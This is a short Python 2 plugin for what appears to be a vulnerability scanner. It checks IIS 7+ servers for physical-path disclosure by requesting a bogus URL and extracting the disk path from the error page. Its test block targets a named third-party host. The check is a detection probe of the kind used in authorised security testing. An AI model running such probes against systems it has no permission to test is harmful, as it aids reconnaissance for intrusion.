#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Time    : 2018/12/20 17:37
@Author  : gzh
@contact : k39aE465wlulvnkhT0i9MQ==@qq.com
@Site    : 
@File    : iis_pathget.py
@Desc    : IIS7以上物理路径泄露
@Software: PyCharm
"""


from ..miniCurl import Curl
from ..t import T
import re

class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False
        url = arg + 'testvulxxxxxxxxxxxxxxxxxxxx'
        code, head, body, error, _ = curl.curl(url)
        #修正正则，可匹配非中文情况
        m = re.search(r'</th><td>[(&nbsp;)]*(.+)\\testvulxxxxxxxxxxxxxxxxxxxx',body)
        if m:
            output(m.group(1),result,'info')
        del curl
        return result


def output(url,result,label):
    info = url + '  iis  Vul '
    result['result'] = True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type'] = 'iis path get Vul'
    result['VerifyInfo']['URL'] = url
    result['VerifyInfo']['payload'] = '/middle/iis/iis_pathget.py'
    result['VerifyInfo']['level'] = label
    result['VerifyInfo']['result'] = info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')